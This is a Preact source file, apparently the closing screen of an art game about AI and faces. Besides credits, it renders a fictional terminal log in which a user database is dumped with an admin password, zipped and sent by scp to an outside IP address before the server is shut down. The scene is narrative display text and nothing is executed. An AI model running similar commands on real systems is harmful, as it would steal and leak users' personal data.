import { FunctionalComponent, h } from "preact"
import { useTypedSelector } from "../../lib/store"
import { getStartingBalance, toDollars } from "../../lib/job"
import * as style from "./style.css"
import { uuid, addMessage } from "../../lib/logging"

const Epilogue: FunctionalComponent = () => {
  addMessage("epilogue", {})
  const completedJobs = useTypedSelector(state => state.completedJobs)
  const grandTotal = toDollars(getStartingBalance(completedJobs))

  const selected = completedJobs.map(job => {
    return {
      name: job.name,
      trait: job.trait,
      tip: job.tip
    }
  })

  return (
    <div className={`content ${style.appError}`}>
      <pre>
        {`   _                          
 _|_ _.  _  _        _  ._ |  
  | (_| (_ (/_ \\/\\/ (_) |  |< 

`}
        By <a href="https://twitter.com/kcimc">Kyle</a>, with{" "}
        <a href="https://gregborenstein.com/">Greg</a>,{" "}
        <a href="https://www.outofambit.com/">Evelyn</a>,{" "}
        <a href="http://trytobegood.com/">Fei</a> and{" "}
        <a href="https://github.com/seport">Sarah</a>. Supported by{" "}
        <a href="https://blog.mozilla.org/blog/2019/09/17/examining-ais-effect-on-media-and-truth/">
          Mozilla
        </a>
        .
        {`

root@facework$ status ${uuid}
Total: ${grandTotal}
Jobs: ${JSON.stringify(selected, null, 1)}
root@facework$ dbexport "users" -u admin -p deboulogne1862 > users.csv && zip users.zip users.csv && ls -lh users.zip
  adding: users.csv (deflated 63%)
-rw-r--r--@ 1 root  root   2.5G Nov 16  2020 users.zip
root@facework$ scp users.zip AfIaR0sl@45.55.87.240
users.zip       100%   2.5G   198.3MB/s   01:36
root@facework$ shutdown -h now
Connection closed by facework.app`}
      </pre>
      <video class={style.videoBackground} autoPlay muted playsInline loop>
        <source src="/assets/images/bg-15-15-gray-480p.mp4" type="video/mp4" />
      </video>
    </div>
  )
}

export default Epilogue
